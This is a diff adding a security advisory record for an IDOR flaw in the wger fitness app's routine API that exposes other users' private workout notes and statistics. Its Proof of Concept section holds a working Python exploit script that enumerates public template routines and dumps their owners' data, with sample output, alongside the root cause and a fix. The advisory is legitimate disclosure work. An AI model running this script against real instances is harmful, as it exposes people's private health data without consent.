@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-cj9g-27ph-4cgv",
+  "modified": "2026-05-14T16:39:48.657210Z",
+  "published": "2026-05-14T16:16:21Z",
+  "aliases": [
+    "CVE-2026-43977"
+  ],
+  "summary": "wger Vulnerable to IDOR: Authenticated Users Can Read Any User's Private Workout Session Data via Template Routine API",
+  "details": "### Summary \nAny authenticated user can read another user's private workout session notes, exercise history, and training statistics by calling the /logs/ and /stats/ actions on a routine they do not own.\n\nThe RoutinePermission class grants read access to any authenticated user when a routine has is_template=True, regardless of ownership. The /logs/ and /stats/ API actions use the same permission check but return the routine owner's personal training data instead of the requesting user's data, creating an insecure direct object reference (IDOR).\n\nAn attacker with a free account can enumerate all public template routine IDs via GET /api/v2/routine/?is_template=true, then call \nGET /api/v2/routine/{id}/logs/ and GET /api/v2/routine/{id}/stats/ to access the owner's private health data including workout notes, weights, repetitions, and performance statistics.\n\n### Description\n\nwger exposes a REST API endpoint that allows any authenticated user to retrieve the **private workout session notes, exercise logs, and training statistics** belonging to another user, as long as that user has at least one routine marked as a public template.\n\nThe vulnerability exists in `RoutineViewSet` (`wger/manager/api/views.py`). The view defines two custom actions  `/logs/` and `/stats/`  that are intended to return data for the **requesting user's own** training history within a routine. However, the underlying permission check (`RoutinePermission.has_object_permission`) grants read access to **any** authenticated user when the routine has `is_template=True`, regardless of ownership. When the `/logs/` or `/stats/` actions are invoked against a routine the attacker does not own, they return the **owner's** private workout history, not the attacker's.\n\n### Root Cause\n\n**File:** `wger/manager/api/permissions.py`, lines 30–41\n\n```python\ndef has_object_permission(self, request, view, obj):\n    if obj.user == request.user:\n        return True\n\n    if obj.is_template:                                  # ← any template is readable\n        return request.method in permissions.SAFE_METHODS  # by any authenticated user\n\n    return False\n```\n\n**File:** `wger/manager/api/views.py`, lines 173–199\n\n```python\n@action(detail=True, url_path='logs')\ndef logs(self, request, pk):\n    out = LogDisplaySerializer(\n        self.get_object().logs_display(),   # ← returns OWNER's logs, not request.user's\n        many=True,\n    ).data\n    return Response(out)\n\n@action(detail=True, url_path='stats')\ndef stats(self, request, pk):\n    out = LogStatsDataSerializer(\n        self.get_object().calculate_log_statistics()  # ← owner's statistics\n    ).data\n    return Response(out)\n```\n\n`self.get_object()` retrieves the routine belonging to the **owner** (e.g., user A). Since `is_template=True` passes the permission check for any authenticated user, the attacker's request reaches `logs_display()` and `calculate_log_statistics()`, which return the **owner's** workout history, not the attacker's.\n\nThe intended behavior is that templates are public workout *plans* (exercise structure, sets, reps), but the `/logs/` and `/stats/` actions expose the *owner's personal training history* logged against that plan.\n\n\n### Impact\n\nAn authenticated attacker can:\n\n1. **Enumerate** all public template routines across all users:\n   `GET /api/v2/routine/?is_template=true\u0026is_public=true`\n\n2. **Read private workout session notes** (freeform text entered by the victim after each workout session)\n\n3. **Read full workout history** including exercise names, weights, repetitions, and dates\n\n4. **Read training statistics** including volume, intensity, and set counts per muscle group and mesocycle\n\nThis data is health-related and personal. Under GDPR and similar regulations, unauthorized access to personal health data constitutes a data breach.\n\n\n### Proof of Concept\n\n#### Scenario\n\nThere are two users in the system:\n\n- **alice** : a regular wger user who has been using the platform for months. She created a routine called \"My 5/3/1 Program\" and marked it as a public template so others can copy her exercise structure. She logs all her workouts with personal notes after each session.\n\n- **bob** :  a second registered user who has never interacted with alice's account.\n\n**The attack:**\n\nBob calls the routine listing endpoint to find all public templates. He gets back alice's routine ID. He then calls `/api/v2/routine/{id}/logs/`  an endpoint that should only show his own logs but instead receives alice's full workout history, including all her session notes (\"Felt strong today, PR on squat\"), weights, and performance data.\n\nBob does **not** need to know alice's username. He only needs her routine ID, which is a sequential integer discoverable by iterating `?is_template=true`.\n\n#### Step-by-step\n\n1. Bob registers a free account on the wger instance and obtains a JWT access token via `POST /api/v2/token`.\n\n2. Bob calls `GET /api/v2/routine/?is_template=true\u0026is_public=true` this lists all public template routines from **all users** across the platform, including their IDs.\n\n3. For each routine ID returned, Bob calls `GET /api/v2/routine/{id}/logs/`  this returns the **routine owner's** workout sessions, including freeform personal notes and all logged exercises with weights and reps.\n\n4. Bob calls `GET /api/v2/routine/{id}/stats/` to get aggregated statistics (total volume, intensity by muscle group, weekly progression) for the routine's owner.\n\nNo special permissions are needed. A fresh account (1-minute-old) can exploit this.\n\n#### Python PoC\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: IDOR - Workout Session Data Exposure via Template Routine API\nAffected: wger \u003c= 2.5.0a2\nTarget:   GET /api/v2/routine/{id}/logs/\n          GET /api/v2/routine/{id}/stats/\n\"\"\"\n\nimport requests\nimport json\n\nBASE_URL = \"http://TARGET_IP\"  # replace with target\n\n\ndef get_token(username, password):\n    r = requests.post(\n        f\"{BASE_URL}/api/v2/token\",\n        json={\"username\": username, \"password\": password},\n    )\n    r.raise_for_status()\n    return r.json()[\"access\"]\n\n\ndef exploit(attacker_token):\n    headers = {\"Authorization\": f\"Bearer {attacker_token}\"}\n\n    # Step 1: Enumerate all public template routines (from ALL users)\n    print(\"[*] Step 1: Enumerating public template routines...\")\n    r = requests.get(\n        f\"{BASE_URL}/api/v2/routine/\",\n        params={\"is_template\": \"true\", \"is_public\": \"true\"},\n        headers=headers,\n    )\n    routines = r.json().get(\"results\", [])\n    print(f\"[+] Found {len(routines)} public template routine(s)\\n\")\n\n    for routine in routines:\n        routine_id = routine[\"id\"]\n        routine_name = routine[\"name\"]\n        print(f\"[*] Targeting routine #{routine_id}: '{routine_name}'\")\n\n        # Step 2: Fetch the OWNER's workout session logs (IDOR)\n        logs_r = requests.get(\n            f\"{BASE_URL}/api/v2/routine/{routine_id}/logs/\",\n            headers=headers,\n        )\n\n        if logs_r.status_code == 200:\n            sessions = logs_r.json()\n            print(f\"[+] VULNERABLE! Got {len(sessions)} session(s):\")\n            for session in sessions:\n                s = session.get(\"session\", {})\n                print(f\"    Date:       {s.get('date')}\")\n                print(f\"    Notes:      {s.get('notes')}\")   # ← private user notes\n                print(f\"    Impression: {s.get('impression')}\")\n                print(f\"    Logs:       {len(session.get('logs', []))} exercise entries\")\n                print()\n\n        # Step 3: Fetch the OWNER's training statistics (IDOR)\n        stats_r = requests.get(\n            f\"{BASE_URL}/api/v2/routine/{routine_id}/stats/\",\n            headers=headers,\n        )\n\n        if stats_r.status_code == 200:\n            stats = stats_r.json()\n            print(f\"[+] Training statistics for routine #{routine_id}:\")\n            volume = stats.get(\"volume\", {}).get(\"mesocycle\", {})\n            print(f\"    Total volume:      {volume.get('total')} kg\")\n            print(f\"    Upper body volume: {volume.get('upper_body')} kg\")\n            print(f\"    Lower body volume: {volume.get('lower_body')} kg\")\n            print()\n\n        print(\"-\" * 60)\n\n\nif __name__ == \"__main__\":\n    # Attacker uses their OWN credentials (no privilege needed)\n    print(\"[*] Authenticating as attacker (bob)...\")\n    token = get_token(\"bob\", \"bobpassword\")\n    print(f\"[+] Token acquired\\n\")\n\n    exploit(token)\n```\n\n#### Expected output\n\n```\n[*] Authenticating as attacker (bob)...\n[+] Token acquired\n\n[*] Step 1: Enumerating public template routines...\n[+] Found 1 public template routine(s)\n\n[*] Targeting routine #1: 'Admin Secret Routine'\n[+] VULNERABLE! Got 1 session(s):\n    Date:       2024-06-15\n    Notes:      SECRET workout note      ← alice's private note\n    Impression: 3\n    Logs:       0 exercise entries\n\n[+] Training statistics for routine #1:\n    Total volume:      0.00 kg\n    Upper body volume: 0.00 kg\n    Lower body volume: 0.00 kg\n```\n\n\u003cimg width=\"671\" height=\"594\" alt=\"image\" src=\"https://github.com/user-attachments/assets/473cfd87-a63a-452d-a4f3-1aad23c4be24\" /\u003e\n\n\n### Recommended Fix\n\nThe `/logs/` and `/stats/` actions must filter results to the **requesting user**, not the routine owner.\n\n```python\n# wger/manager/api/views.py\n\n@action(detail=True, url_path='logs')\ndef logs(self, request, pk):\n    routine = self.get_object()\n    # Only return logs for the requesting user, regardless of routine ownership\n    out = LogDisplaySerializer(\n        routine.logs_display(user=request.user),\n        many=True,\n    ).data\n    return Response(out)\n\n@action(detail=True, url_path='stats')\ndef stats(self, request, pk):\n    routine = self.get_object()\n    out = LogStatsDataSerializer(\n        routine.calculate_log_statistics(user=request.user)\n    ).data\n    return Response(out)\n```\n\nAdditionally, `RoutinePermission.has_object_permission` should explicitly deny access to the `/logs/` and `/stats/` actions for non-owners, regardless of `is_template`:\n\n```python\ndef has_object_permission(self, request, view, obj):\n    if obj.user == request.user:\n        return True\n\n    # Template routines are readable, but only their structure \n    # never their owner's personal training history\n    if obj.is_template and view.action not in ('logs', 'stats'):\n        return request.method in permissions.SAFE_METHODS\n\n    return False\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "wger",
+        "purl": "pkg:pypi/wger"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "2.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.1",
+        "1.1.1",
+        "1.2",
+        "1.2rc1",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.7",
+        "1.8",
+        "1.9",
+        "2.0",
+        "2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-cj9g-27ph-4cgv/GHSA-cj9g-27ph-4cgv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/wger-project/wger/security/advisories/GHSA-cj9g-27ph-4cgv"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/wger-project/wger"
+    }
+  ]
+}
